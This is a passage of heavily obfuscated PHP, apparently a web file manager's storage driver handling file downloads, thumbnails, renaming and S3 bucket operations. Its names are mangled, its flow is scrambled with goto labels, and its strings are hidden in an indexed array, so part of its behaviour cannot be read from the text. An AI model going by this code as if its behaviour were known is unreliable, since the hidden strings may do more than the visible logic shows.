(strstr($d±Û¢óæà, $e»Ñƒ®³º[137])) { header($e»Ñƒ®³º[138] . $CßŠ°ôÜ); } else { if (strstr($d±Û¢óæà, $e»Ñƒ®³º[139])) { header($e»Ñƒ®³º[140] . $CßŠ°ôÜ); } else { if (strstr($d±Û¢óæà, $e»Ñƒ®³º[141])) { header($e»Ñƒ®³º[142] . $CßŠ°ôÜ); } } } if ($c—Ã÷®“Éº) { header($e»Ñƒ®³º[143] . $c—Ã÷®“Éº); } return; } goto b¦£Ñªöß½; D¿ã¿­•¼´: $cé¦§Êé = $e»Ñƒ®³º[112] . $cé¦§Êé . $e»Ñƒ®³º[116] . $cé¦§Êé; if ($Aë“˜Õ¡ç) { header($e»Ñƒ®³º[117]); header($e»Ñƒ®³º[118] . $cé¦§Êé); } else { header($e»Ñƒ®³º[119] . $cé¦§Êé); } header($e»Ñƒ®³º[120]); goto BÈ­¸ÒÀø; BÈ­¸ÒÀø: header($e»Ñƒ®³º[121] . $d¼ù¶æŠ®Ê); header($e»Ñƒ®³º[122] . gmdate($e»Ñƒ®³º[105], time() + 3600 * 24 * 30) . $e»Ñƒ®³º[123]); header($e»Ñƒ®³º[124]); goto EÔ‹ºÉƒ‚›; B…œ ä‘: $bõÅ‹Ü¡â = $bö½’‡ˆéè - 1; $E¿òÌ­•à = $this->ext($e¬´÷İğø); if (in_array($E¿òÌ­•à, array($e»Ñƒ®³º[107], $e»Ñƒ®³º[108], $e»Ñƒ®³º[109], $e»Ñƒ®³º[110]))) { $E¿òÌ­•à = $e»Ñƒ®³º[111]; } goto dÄìÂâííÍ; F¦™‚ˆË‹¢: $Dİ„ ŒÈ÷± = 1024 * 100; $AÆ¨Ò’İè« = 0; if ($c—Ã÷®“Éº) { $AÆ¨Ò’İè« = intval(1000 * 1000 * ($Dİ„ ŒÈ÷± / $c—Ã÷®“Éº)); } goto B§‘ÓòŠ¢÷; bª¨‰¤Á­: } public function fileOutServer($EÊßÑÉ”Ûã, $E‚ƒŸ‡ ¬Ë = false, $bäëÚÕ—Ò = false, $d¯«Îµíİ = '') { self::fileOut($EÊßÑÉ”Ûã, $E‚ƒŸ‡ ¬Ë, $bäëÚÕ—Ò, $d¯«Îµíİ); } public function fileOutLink($bŒá²­ù) { $b„´—‰Ëø« =& $_SERVER[İë¬“ÅÒÛ›]; if (substr($bŒá²­ù, 0, 7) == $b„´—‰Ëø«[151]) { $bŒá²­ù = $b„´—‰Ëø«[152] . substr($bŒá²­ù, 7); } header($b„´—‰Ëø«[153] . $bŒá²­ù); die; } public function cacheMehod($E·»Ø‚Ì§ñ, $Eß¦›ŞÊô×) { goto eİÌÉ¶™µ¦; eİÌÉ¶™µ¦: $dÀ…¨ôß¬ =& $_SERVER[İë¬“ÅÒÛ›]; static $aÌÅ¢ŒÛ‰¡ = array(); $e´ÑƒÓÖèÇ = $dÀ…¨ôß¬[154] . $E·»Ø‚Ì§ñ . $dÀ…¨ôß¬[155] . rtrim($Eß¦›ŞÊô×, $dÀ…¨ôß¬[8]); goto d™ÌòğÓ¤§; Eš¡°ƒ…çÍ: $aÌÅ¢ŒÛ‰¡[$e´ÑƒÓÖèÇ] = $Eô¡Çç·¤Ù; return $Eô¡Çç·¤Ù; goto d¾º»²Âƒ; d™ÌòğÓ¤§: $Eô¡Çç·¤Ù = isset($aÌÅ¢ŒÛ‰¡[$e´ÑƒÓÖèÇ]) ? $aÌÅ¢ŒÛ‰¡[$e´ÑƒÓÖèÇ] : null; if (!is_null($Eô¡Çç·¤Ù)) { return $Eô¡Çç·¤Ù; } $Eô¡Çç·¤Ù = $this->{$E·»Ø‚Ì§ñ}($Eß¦›ŞÊô×); goto Eš¡°ƒ…çÍ; d¾º»²Âƒ: } public function fileOutImage($eÉìŞ‘™ôĞ, $dÏ÷§ëÙ¬ï = 250) { goto C”Åõƒ­œ; bˆÓõÍ’: $Eó¿èÔ¡ğÇ = DATA_THUMB . $BÁ×åğñïµ; if (!@file_exists($Eó¿èÔ¡ğÇ)) { $C´çÃŠÀŠ¾ = TEMP_FILES; if (!is_dir($C´çÃŠÀŠ¾)) { mk_dir($C´çÃŠÀŠ¾); } $fãê³Ùß™ = $C´çÃŠÀŠ¾ . $e¦™Ì‚ŞÙš . $eç›–ËäÉ[92] . $FÆ”èµÉÎ[$eç›–ËäÉ[157]]; if (!@file_exists($fãê³Ùß™)) { $fãê³Ùß™ = $this->download($eÉìŞ‘™ôĞ, $fãê³Ùß™); } $e‰Û±µ½»­ = new ImageThumb($fãê³Ùß™, $eç›–ËäÉ[164]); $e‰Û±µ½»­->prorate($Eó¿èÔ¡ğÇ, $dÏ÷§ëÙ¬ï, $dÏ÷§ëÙ¬ï); } if (!file_exists($Eó¿èÔ¡ğÇ) || filesize($Eó¿èÔ¡ğÇ) < 100) { return @file_exists($fãê³Ùß™) ? IO::fileOut($fãê³Ùß™) : $this->fileOut($eÉìŞ‘™ôĞ); } goto bÑÊñ‰÷Õ’; EŞ’‡¸·‡: if (!($a ¦Ì£µŸ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $eç›–ËäÉ[162]))) { $c»ÒŠš—¯‚ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $eç›–ËäÉ[163]); } else { $c»ÒŠš—¯‚ = KodIO::make($a ¦Ì£µŸ); } if ($a ¦Ì£µŸ = IO::fileNameExist($c»ÒŠš—¯‚, $BÁ×åğñïµ)) { $Eó¿èÔ¡ğÇ = KodIO::make($a ¦Ì£µŸ); return IO::fileOut($Eó¿èÔ¡ğÇ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto bˆÓõÍ’; EÂæÆ²‚Ø: if ($FÆ”èµÉÎ[$eç›–ËäÉ[78]] <= 1024 * 50 || !function_exists($eç›–ËäÉ[156]) || $FÆ”èµÉÎ[$eç›–ËäÉ[157]] == $eç›–ËäÉ[158]) { return $this->fileOut($eÉìŞ‘™ôĞ); } if (isset($FÆ”èµÉÎ[$eç›–ËäÉ[159]][$eç›–ËäÉ[160]])) { $e¦™Ì‚ŞÙš = $FÆ”èµÉÎ[$eç›–ËäÉ[159]][$eç›–ËäÉ[160]]; } else { if (isset($FÆ”èµÉÎ[$eç›–ËäÉ[159]][$eç›–ËäÉ[161]])) { $e¦™Ì‚ŞÙš = $FÆ”èµÉÎ[$eç›–ËäÉ[159]][$eç›–ËäÉ[161]]; } else { $e¦™Ì‚ŞÙš = md5("{$FÆ”èµÉÎ[$eç›–ËäÉ[28]]}\x5f{$FÆ”èµÉÎ[$eç›–ËäÉ[76]]}\137{$FÆ”èµÉÎ[$eç›–ËäÉ[78]]}"); } } $BÁ×åğñïµ = "{$e¦™Ì‚ŞÙš}\137{$dÏ÷§ëÙ¬ï}\56\x70\156\x67"; goto EŞ’‡¸·‡; bÑÊñ‰÷Õ’: if (!($f£ë—â’Ã‘ = IO::move($Eó¿èÔ¡ğÇ, $c»ÒŠš—¯‚))) { return IO::fileOut($Eó¿èÔ¡ğÇ); } del_file($Eó¿èÔ¡ğÇ); IO::fileOut($f£ë—â’Ã‘); goto fº ÇŞ¡œÈ; C”Åõƒ­œ: $eç›–ËäÉ =& $_SERVER[İë¬“ÅÒÛ›]; if (substr($eÉìŞ‘™ôĞ, 0, 4) == $eç›–ËäÉ[141]) { $this->fileOutLink($eÉìŞ‘™ôĞ); } $FÆ”èµÉÎ = $this->info($eÉìŞ‘™ôĞ); goto EÂæÆ²‚Ø; fº ÇŞ¡œÈ: } public function fileOutImageServer($FƒˆĞ¼ŸÑø, $f‘å’…Ğ = 250) { self::fileOutImage($FƒˆĞ¼ŸÑø, $f‘å’…Ğ); } public function fileNameAuto($AÀ†ÚŒñÙ’, $DŸ¶•¶‰¥Å, $Aø¼ĞÌ = REPEAT_RENAME, $FÃ÷À·œ‚› = false) { goto Eí©‚çôºø; Eí©‚çôºø: $AªÀƒÄ÷‹Ô =& $_SERVER[İë¬“ÅÒÛ›]; $E¡¯¾ˆË = $AÀ†ÚŒñÙ’ === $AªÀƒÄ÷‹Ô[33] ? $DŸ¶•¶‰¥Å : rtrim($AÀ†ÚŒñÙ’, $AªÀƒÄ÷‹Ô[8]) . $AªÀƒÄ÷‹Ô[8] . $DŸ¶•¶‰¥Å; if ($Aø¼ĞÌ == REPEAT_REPLACE || !$this->exist($E¡¯¾ˆË) || $FÃ÷À·œ‚› && $Aø¼ĞÌ != REPEAT_RENAME_FOLDER) { return $DŸ¶•¶‰¥Å; } goto c â¡‚Ÿ»; B÷ãá¾½: while ($this->exist(rtrim($AÀ†ÚŒñÙ’, $AªÀƒÄ÷‹Ô[8]) . $AªÀƒÄ÷‹Ô[8] . $b–”õÜîÜ÷)) { $b–”õÜîÜ÷ = $f­Úáµ¿Åƒ . "\50{$eÈÈÅÉº÷¥}\x29{$DÖÁ¶ùƒ¤}"; $eÈÈÅÉº÷¥++; } return $b–”õÜîÜ÷; goto C¹ÛÀè…†É; c â¡‚Ÿ»: if ($Aø¼ĞÌ == REPEAT_SKIP) { return !1; } $DÖÁ¶ùƒ¤ = $AªÀƒÄ÷‹Ô[92] . get_path_ext($DŸ¶•¶‰¥Å); $DÖÁ¶ùƒ¤ = $DÖÁ¶ùƒ¤ == $AªÀƒÄ÷‹Ô[92] || $FÃ÷À·œ‚› ? $AªÀƒÄ÷‹Ô[33] : $DÖÁ¶ùƒ¤; goto A‘¦ŠïÜ‡¤; A‘¦ŠïÜ‡¤: $eÈÈÅÉº÷¥ = 1; $f­Úáµ¿Åƒ = substr($DŸ¶•¶‰¥Å, 0, strlen($DŸ¶•¶‰¥Å) - strlen($DÖÁ¶ùƒ¤)); $b–”õÜîÜ÷ = $f­Úáµ¿Åƒ . "\x28{$eÈÈÅÉº÷¥}\x29{$DÖÁ¶ùƒ¤}"; goto B÷ãá¾½; C¹ÛÀè…†É: } public function listAllFiles($c½æ¨Äê×, $FŠ—ˆÈ÷ŞÊ, $dŒãâÀ = array()) { goto Dƒí“‡Œä•; Dƒí“‡Œä•: $C•‡˜‚†‘× =& $_SERVER[İë¬“ÅÒÛ›]; if (empty($FŠ—ˆÈ÷ŞÊ)) { return array(); } $FÛ„èÓ‡‚é = array(); goto a°¿÷ô¡é¸; a°¿÷ô¡é¸: $c½æ¨Äê× = trim($c½æ¨Äê×, $C•‡˜‚†‘×[8]); foreach ($FŠ—ˆÈ÷ŞÊ as $f¤‹ƒŞ«Ë) { $BÚ‡³ª÷²• = ltrim(substr($f¤‹ƒŞ«Ë, strlen($c½æ¨Äê×)), $C•‡˜‚†‘×[8]); $FÛ„èÓ‡‚é = array_merge($FÛ„èÓ‡‚é, $this->slicePath($BÚ‡³ª÷²•)); } $f‡²ÊøÁƒÔ = array(); goto cĞ‘²ÎºÁ³; cĞ‘²ÎºÁ³: foreach (array_unique($FÛ„èÓ‡‚é) as $f¤‹ƒŞ«Ë) { $B¸ÁÛ¬¬È° = array($C•‡˜‚†‘×[76] => $this->getPathOuter($C•‡˜‚†‘×[8] . $c½æ¨Äê× . $C•‡˜‚†‘×[8] . $f¤‹ƒŞ«Ë), $C•‡˜‚†‘×[77] => 1, $C•‡˜‚†‘×[78] => 0); if (substr($f¤‹ƒŞ«Ë, -1) != $C•‡˜‚†‘×[8]) { $B¸ÁÛ¬¬È°[$C•‡˜‚†‘×[77]] = 0; $dÉõï¾£á = $this->getPath($c½æ¨Äê× . $C•‡˜‚†‘×[8] . $f¤‹ƒŞ«Ë); $B¸ÁÛ¬¬È°[$C•‡˜‚†‘×[78]] = isset($dŒãâÀ[$dÉõï¾£á]) ? $dŒãâÀ[$dÉõï¾£á] : $this->size($dÉõï¾£á); } $f‡²ÊøÁƒÔ[] = $B¸ÁÛ¬¬È°; } return $f‡²ÊøÁƒÔ; goto B¸ã®êáŒ‘; B¸ã®êáŒ‘: } public function slicePath($E‘…Ê„Œ) { $bäÉ‡Âèš† =& $_SERVER[İë¬“ÅÒÛ›]; $Dè—Õ¡œõ¶ = explode($bäÉ‡Âèš†[8], trim($E‘…Ê„Œ, $bäÉ‡Âèš†[8])); $AÛ¦ê¡Áº‹ = 0; do { ++$AÛ¦ê¡Áº‹; $aœæ—ªÁá“[] = implode($bäÉ‡Âèš†[8], array_slice($Dè—Õ¡œõ¶, 0, $AÛ¦ê¡Áº‹)) . $bäÉ‡Âèš†[8]; } while ($AÛ¦ê¡Áº‹ < count($Dè—Õ¡œõ¶)); $aœæ—ªÁá“[count($Dè—Õ¡œõ¶) - 1] = $E‘…Ê„Œ; return $aœæ—ªÁá“; } public function getHost() { $dÌƒ©ù­ë =& $_SERVER[İë¬“ÅÒÛ›]; $C¦“ââªí– = parse_url(trim($this->domain, $dÌƒ©ù­ë[8])); $bº”‚ŠÑ´™ = isset($C¦“ââªí–[$dÌƒ©ù­ë[165]]) ? $C¦“ââªí–[$dÌƒ©ù­ë[165]] : http_type(); $bšíâ‡ù¹® = isset($C¦“ââªí–[$dÌƒ©ù­ë[166]]) ? $C¦“ââªí–[$dÌƒ©ù­ë[166]] : $C¦“ââªí–[$dÌƒ©ù­ë[76]]; if (isset($C¦“ââªí–[$dÌƒ©ù­ë[167]])) { $bšíâ‡ù¹® .= $dÌƒ©ù­ë[4] . $C¦“ââªí–[$dÌƒ©ù­ë[167]]; } return $bº”‚ŠÑ´™ . $dÌƒ©ù­ë[168] . $bšíâ‡ù¹®; } public function pathEncode($bÛÓøÇ¤‚÷) { $f¦Š¼ò³ =& $_SERVER[İë¬“ÅÒÛ›]; return str_replace($f¦Š¼ò³[169], $f¦Š¼ò³[8], rawurlencode($bÛÓøÇ¤‚÷)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public function __construct($aìŸÂòïë) { set_timeout(); require_once SDK_DIR . $_SERVER[İë¬“ÅÒÛ›][170]; parent::__construct(); $this->_init($aìŸÂòïë); } public function _init($c„Î¯ù¢) { foreach ($c„Î¯ù¢ as $FĞ÷¼ø¢¶à => $FÖ©ß„Ÿ°ˆ) { if (isset($this->{$FĞ÷¼ø¢¶à})) { $this->{$FĞ÷¼ø¢¶à} = $FÖ©ß„Ÿ°ˆ; } } $this->endpoint = $c„Î¯ù¢[$_SERVER[İë¬“ÅÒÛ›][171]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); $this->client->setChunkSize($this->osChunkSize()); } public function signatureVersion($Dà†ÊÉÎÅ´ = "\166\64") { $this->signVer = $Dà†ÊÉÎÅ´; $this->client->setSignatureVersion($Dà†ÊÉÎÅ´); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto Cï¿Œáâß“; Cï¿Œáâß“: $D‚˜ÅõÌ¹ï =& $_SERVER[İë¬“ÅÒÛ›]; $b†ç¿½äç» = $this->getBucketCors(); if (!$b†ç¿½äç» || !is_array($b†ç¿½äç»)) { return !1; } goto f´¬’£­à; f´¬’£­à: if ($b†ç¿½äç»[$D‚˜ÅõÌ¹ï[172]] != $D‚˜ÅõÌ¹ï[173] || $b†ç¿½äç»[$D‚˜ÅõÌ¹ï[174]] != $D‚˜ÅõÌ¹ï[173]) { return !1; } $eä©Æ¾È¬„ = array_map($D‚˜ÅõÌ¹ï[175], $b†ç¿½äç»[$D‚˜ÅõÌ¹ï[176]]); if (!is_array($eä©Æ¾È¬„)) { $eä©Æ¾È¬„ = array(); } goto C½©­Š–†Û; C½©­Š–†Û: $FÍãÖåîâå = array($D‚˜ÅõÌ¹ï[177], $D‚˜ÅõÌ¹ï[178], $D‚˜ÅõÌ¹ï[179], $D‚˜ÅõÌ¹ï[180], $D‚˜ÅõÌ¹ï[181]); $F¬Ê‘„×‘‹ = array_diff($FÍãÖåîâå, $eä©Æ¾È¬„); return empty($F¬Ê‘„×‘‹); goto b‘Ë±µ—ã; b‘Ë±µ—ã: } public function mkfile($dâ÷òóóæƒ, $aÌÒ’â…·µ = '', $C˜¼îã·š = REPEAT_RENAME) { $a¶—¨Äá = $this->setContent($dâ÷òóóæƒ, $aÌÒ’â…·µ); if ($a¶—¨Äá !== !1) { return $this->getPathOuter($dâ÷òóóæƒ); } return !1; } public function mkdir($E¼ç¾·šá¼, $D¿¯ÕƒÊƒˆ = REPEAT_SKIP) { if (empty($E¼ç¾·šá¼)) { return !1; } if ($this->_isFolder($E¼ç¾·šá¼)) { return $this->getPathOuter($E¼ç¾·šá¼); } $EáÊáä±‘ï = $this->setContent($E¼ç¾·šá¼, $_SERVER[İë¬“ÅÒÛ›][33], !0); if ($EáÊáä±‘ï !== !1) { return $this->getPathOuter($E¼ç¾·šá¼); } return !1; } public function copyFile($BõÜ·©ˆ«¼, $B÷ˆÊ“Öà, $f„¸˜†×…é = array()) { $E¯ïÆ¹æ‹Å =& $_SERVER[İë¬“ÅÒÛ›]; $a±İ±Å˜ç´ = $this->getObjectInfo($BõÜ·©ˆ«¼); if (!$a±İ±Å˜ç´) { return !1; } if ($a±İ±Å˜ç´[$E¯ïÆ¹æ‹Å[78]] <= 1024 * 1024 * 200) { $A‰Ş¸ô‹á¿ = $this->client->copyObject($this->bucket, $BõÜ·©ˆ«¼, $this->bucket, $B÷ˆÊ“Öà, $E¯ïÆ¹æ‹Å[182], $f„¸˜†×…é); } else { $A‰Ş¸ô‹á¿ = $this->client->multiCopyObject($this->bucket, $BõÜ·©ˆ«¼, $this->bucket, $B÷ˆÊ“Öà, $f„¸˜†×…é); } $A‰Ş¸ô‹á¿ = $A‰Ş¸ô‹á¿ ? $this->getPathOuter($B÷ˆÊ“Öà) : !1; return $A‰Ş¸ô‹á¿; } public function moveFile($e’—ñ„Ş¦, $AÒç¤†‚ª®) { if ($this->copyFile($e’—ñ„Ş¦, $AÒç¤†‚ª®)) { $this->delFile($e’—ñ„Ş¦); return $this->getPathOuter($AÒç¤†‚ª®); } return !1; } public function delFile($a¼’†ŸÂ™·) { return $this->client->deleteObject($this->bucket, $a¼’†ŸÂ™·); } public function delFolder($fÆÇç‰£ñâ) { goto FÛáíË•µà; FÛáíË•µà: $a„—ŞƒÕ‰Ğ =& $_SERVER[İë¬“ÅÒÛ›]; $F°À™Óê = $this->listObjs($fÆÇç‰£ñâ); if (!$F°À™Óê) { $fÆÇç‰£ñâ = trim($fÆÇç‰£ñâ, $a„—ŞƒÕ‰Ğ[8]); if (!empty($fÆÇç‰£ñâ)) { $fÆÇç‰£ñâ .= $a„—ŞƒÕ‰Ğ[8]; } return $this->delFile($fÆÇç‰£ñâ); } goto F„£ÙÌäƒØ; F’Â÷–îŠñ: return $eÉí¯©™µ± === $c¸†—¸É¤É ? !0 : !1; goto eöõ½ƒîª; F„£ÙÌäƒØ: $eÉí¯©™µ± = $c¸†—¸É¤É = 0; $EÃ­ã—˜Õ = array_chunk(array_keys($F°À™Óê), 1000); foreach ($EÃ­ã—˜Õ as $dĞÛæã óè) { $eÉí¯©™µ±++; $c¸†—¸É¤É += (int) $this->client->deleteObjects($this->bucket, $dĞÛæã óè); } goto F’Â÷–îŠñ; eöõ½ƒîª: } public function rename($c„æ‰ŒØ, $cãª£¤¥–Ò) { return $this->renameObject($c„æ‰ŒØ, $cãª£¤¥–Ò); } public function size($eÆ½¶ö©„) { $e½©øİö«ä =& $_SERVER[İë¬“ÅÒÛ›]; $EÉÌò™º”‰ = $this->info($eÆ½¶ö©„); return isset($EÉÌò™º”‰[$e½©øİö«ä[78]]) ? $EÉÌò™º”‰[$e½©øİö«ä[78]] : 0; } public function _info($E°±å£ôòË) { if ($this->_isFolder($E°±å£ôòË)) { return $this->folderInfo($E°±å£ôòË); } return $this->fileInfo($E°±å£ôòË); } public function info($e¢´Úë÷é‹) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][183], $e¢´Úë÷é‹); } public function isFile($aô¡—¿¹‹) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][184], $aô¡—¿¹‹); } public function isFolder($eŒ“±ñ©) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][185], $eŒ“±ñ©); } public function getObjectInfo($fóì“íé˜) { return $this->_getObjectInfo($fóì“íé˜); } public function exist($DŠœ£°›Œ­) { if ($this->_isFile($DŠœ£°›Œ­)) { return !0; } return $this->_isFolder($DŠœ£°›Œ­); } public function _isFile($FÍ¤ÕÁíí) { return $this->client->getObjectInfo($this->bucket, trim($FÍ¤ÕÁíí, $_SERVER[İë¬“ÅÒÛ›][8]), !1); } public function _isFolder($F“ÆÅÄ‡”) { $aàƒÄÓ®“ë = $this->listObjs($F“ÆÅÄ‡”, null, 1); return !empty($aàƒÄÓ®“ë) ? !0 : !1; } public function listPath($cªÊƒóîŠ², $Eø£Å«¢–– = false) { $b¸¤ ‚‹¤ =& $_SERVER[İë¬“ÅÒÛ›]; $DÇô¸éƒÍ = $this->listObjs($cªÊƒóîŠ², null, null, $b¸¤ ‚‹¤[8]); $EŒ•á†¶Ò“ = array($b¸¤ ‚‹¤[75] => array(), $b¸¤ ‚‹¤[74] => array()); foreach ($DÇô¸éƒÍ as $eğ—ôÔœÌ“ => $fÊè°çÖô®) { if ($eğ—ôÔœÌ“ == $b¸¤ ‚‹¤[8]) { continue; } if (isset($fÊè°çÖô®[$b¸¤ ‚‹¤[186]])) { $EŒ•á†¶Ò“[$b¸¤ ‚‹¤[75]][] = $this->folderInfo($fÊè°çÖô®[$b¸¤ ‚‹¤[186]], $Eø£Å«¢––); } else { if (substr($fÊè°çÖô®[$b¸¤ ‚‹¤[28]], -1) == $b¸¤ ‚‹¤[8]) { continue; } $EŒ•á†¶Ò“[$b¸¤ ‚‹¤[74]][] = $this->fileInfo($fÊè°çÖô®[$b¸¤ ‚‹¤[28]], $fÊè°çÖô®, $Eø£Å«¢––); } } return $EŒ•á†¶Ò“; } private function fileInfo($B˜ƒ±Ùä†½, $B”õ‹†øâŒ = array(), $aèä¶–³œ = false) { goto b…‹êôÉé¸; b…‹êôÉé¸: $a¥Ë…Ì‡ =& $_SERVER[İë¬“ÅÒÛ›]; if ($aèä¶–³œ) { return array($a¥Ë…Ì‡[28] => $this->pathThis($B˜ƒ±Ùä†½), $a¥Ë…Ì‡[76] => $this->getPathOuter($B˜ƒ±Ùä†½), $a¥Ë…Ì‡[29] => $a¥Ë…Ì‡[164], $a¥Ë…Ì‡[157] => $this->ext($B˜ƒ±Ùä†½), $a¥Ë…Ì‡[78] => isset($B”õ‹†øâŒ[$a¥Ë…Ì‡[78]]) ? $B”õ‹†øâŒ[$a¥Ë…Ì‡[78]] : 0); } $EĞÎÊô˜‰É = array($a¥Ë…Ì‡[28] => $this->pathThis($B˜ƒ±Ùä†½), $a¥Ë…Ì‡[76] => $this->getPathOuter($B˜ƒ±Ùä†½), $a¥Ë…Ì‡[29] => $a¥Ë…Ì‡[164], $a¥Ë…Ì‡[187] => $a¥Ë…Ì‡[50], $a¥Ë…Ì‡[106] => $a¥Ë…Ì‡[50], $a¥Ë…Ì‡[78] => 0, $a¥Ë…Ì‡[157] => $this->ext($B˜ƒ±Ùä†½), $a¥Ë…Ì‡[188] => !0, $a¥Ë…Ì‡[189] => !0); goto CØÑ†àªˆš; bÚÊÀ–¾±Å: return $EĞÎÊô˜‰É; goto C¸³Ü¸ªÓœ; CØÑ†àªˆš: if (empty($B”õ‹†øâŒ)) { $B”õ‹†øâŒ = $this->getObjectInfo($B˜ƒ±Ùä†½); if (!$B”õ‹†øâŒ) { return $EĞÎÊô˜‰É; } $this->fileInfoImage($B˜ƒ±Ùä†½, $EĞÎÊô˜‰É); } $EĞÎÊô˜‰É[$a¥Ë…Ì‡[106]] = $B”õ‹†øâŒ[$a¥Ë…Ì‡[190]]; $EĞÎÊô˜‰É[$a¥Ë…Ì‡[78]] = $B”õ‹†øâŒ[$a¥Ë…Ì‡[78]]; goto bÚÊÀ–¾±Å; C¸³Ü¸ªÓœ: } private function folderInfo($fŒà›†‹Ì˜, $E‡³¤¸Íì = false) { goto BìÌ°Á±çì; BìÌ°Á±çì: $bÂÕ“œ‘ªÑ =& $_SERVER[İë¬“ÅÒÛ›]; if ($E‡³¤¸Íì) { return array($bÂÕ“œ‘ªÑ[28] => $this->pathThis($fŒà›†‹Ì˜), $bÂÕ“œ‘ªÑ[76] => $this->getPathOuter($bÂÕ“œ‘ªÑ[8] . $fŒà›†‹Ì˜), $bÂÕ“œ‘ªÑ[29] => $bÂÕ“œ‘ªÑ[77]); } $C½‘”†¾‡ò = array($bÂÕ“œ‘ªÑ[28] => $this->pathThis($fŒà›†‹Ì˜), $bÂÕ“œ‘ªÑ[76] => $this->getPathOuter($bÂÕ“œ‘ªÑ[8] . $fŒà›†‹Ì˜), $bÂÕ“œ‘ªÑ[29] => $bÂÕ“œ‘ªÑ[77], $bÂÕ“œ‘ªÑ[187] => $bÂÕ“œ‘ªÑ[50], $bÂÕ“œ‘ªÑ[106] => $bÂÕ“œ‘ªÑ[50], $bÂÕ“œ‘ªÑ[188] => !0, $bÂÕ“œ‘ªÑ[189] => !0); goto b©½–«Îòô; b©½–«Îòô: if ($fŒà›†‹Ì˜ == $bÂÕ“œ‘ªÑ[33]) { return $C½‘”†¾‡ò; } $FšÂÎÂ’á— = $this->getObjectInfo(trim($fŒà›†‹Ì˜, $bÂÕ“œ‘ªÑ[8]) . $bÂÕ“œ‘ªÑ[8]); if (!$FšÂÎÂ’á—) { return $C½‘”†¾‡ò; } goto b¨­Ÿ©¾ØÄ; b¨­Ÿ©¾ØÄ: $C½‘”†¾‡ò[$bÂÕ“œ‘ªÑ[187]] = $FšÂÎÂ’á—[$bÂÕ“œ‘ªÑ[190]]; $C½‘”†¾‡ò[$bÂÕ“œ‘ªÑ[106]] = $FšÂÎÂ’á—[$bÂÕ“œ‘ªÑ[190]]; return $C½‘”†¾‡ò; goto Dáù®¢¬¶–; Dáù®¢¬¶–: } public function listObjs($c­ÕîºÌ¹, $cËëÏè˜ = null, $Bºğòã¾ = null, $CÏì ĞÃ‡‘ = null) { $EÑÃÂĞŒÖË =& $_SERVER[İë¬“ÅÒÛ›]; $c­ÕîºÌ¹ = trim($c­ÕîºÌ¹, $EÑÃÂĞŒÖË[8]); $bàòâíŒŒ = empty($c­ÕîºÌ¹) ? $EÑÃÂĞŒÖË[33] : $c­ÕîºÌ¹ . $EÑÃÂĞŒÖË[8]; return $this->client->getBucket($this->bucket, $bàòâíŒŒ, $cËëÏè˜, $Bºğòã¾, $CÏì ĞÃ‡‘, !0); } public function has($E¼äöğ°Óë, $f´ëœËÃ¬ = false, $BŠÄæµä“² = true) { goto e±ß½Óõ–±; DÒ³–­ˆ: if ($f´ëœËÃ¬) { return array($dß‘¡ñ ¤ˆ[191] => $eÑî…Õ¢é, $dß‘¡ñ ¤ˆ[192] => $E¿Ÿ®ŠÃ…É); } return !1; goto a¡‚¡Ïˆ; e±ß½Óõ–±: $dß‘¡ñ ¤ˆ =& $_SERVER[İë¬“ÅÒÛ›]; $eÑî…Õ¢é = 0; $E¿Ÿ®ŠÃ…É = 0; goto A²¿¤§›’Õ; A²¿¤§›’Õ: $D´«Ê¥Íù = $this->listObjs($E¼äöğ°Óë, null, null, $dß‘¡ñ ¤ˆ[8]); $D´«Ê¥Íù = is_array($D´«Ê¥Íù) ? $D´«Ê¥Íù : array(); foreach ($D´«Ê¥Íù as $E¼„¨¦‚) { if (isset($E¼„¨¦‚[$dß‘¡ñ ¤ˆ[28]]) && substr($E¼„¨¦‚[$dß‘¡ñ ¤ˆ[28]], -1) != $dß‘¡ñ ¤ˆ[8]) { if (!$f´ëœËÃ¬ && $BŠÄæµä“²) { return !0; } $eÑî…Õ¢é++; } else { if (isset($E¼„¨¦‚[$dß‘¡ñ ¤ˆ[186]])) { if (!$f´ëœËÃ¬ && !$BŠÄæµä“²) { return !1; } $E¿Ÿ®ŠÃ…É++; } } } goto DÒ³–­ˆ; a¡‚¡Ïˆ: } public function listAll($B§¡ƒ»Ó§) { $bÜ”ê“ŞË =& $_SERVER[İë¬“ÅÒÛ›]; $AÜ¥©ØÚŒá = $this->listObjs($B§¡ƒ»Ó§); $Aö’ø¿”—È = $eĞ„ˆİÓ«º = array(); foreach ($AÜ¥©ØÚŒá as $BÂÂ—©¼Ü => $B¹“«ì‚¿) { $Aö’ø¿”—È[] = $B¹“«ì‚¿[$bÜ”ê“ŞË[28]]; $eĞ„ˆİÓ«º[$BÂÂ—©¼Ü] = $B¹“«ì‚¿[$bÜ”ê“ŞË[78]]; } return $this->listAllFiles($B§¡ƒ»Ó§, $Aö’ø¿”—È, $eĞ„ˆİÓ«º); } public function canRead($Bîâ“ÕÒö) { $F¡ˆ…¦á¦‹ =& $_SERVER[İë¬“ÅÒÛ›]; $AŒè¬¹âÌ· = $this->client->getAccessControlPolicy($this->bucket, $Bîâ“ÕÒö); if (!$AŒè¬¹âÌ·) { return !1; } return in_array($AŒè¬¹âÌ·, array($F¡ˆ…¦á¦‹[193], $F¡ˆ…¦á¦‹[194], $F¡ˆ…¦á¦‹[195])) ? !0 : !1; } public function canWrite($f»õöìÀ¨ƒ) { $cŞÒïŠí‹á =& $_SERVER[İë¬“ÅÒÛ›]; $aÛ’ŞĞì¸ç = $this->client->getAccessControlPolicy($this->bucket, $f»õöìÀ¨ƒ); if (!$aÛ’ŞĞì¸ç) { return !1; } return in_array($aÛ’ŞĞì¸ç, array($cŞÒïŠí‹á[193], $cŞÒïŠí‹á[194])) ? !0 : !1; } public function getContent($EŸ´º©Ü—) { return $this->client->getObject($this->bucket, $EŸ´º©Ü—); } public function setContent($dŒ—ÙÇõ©Í, 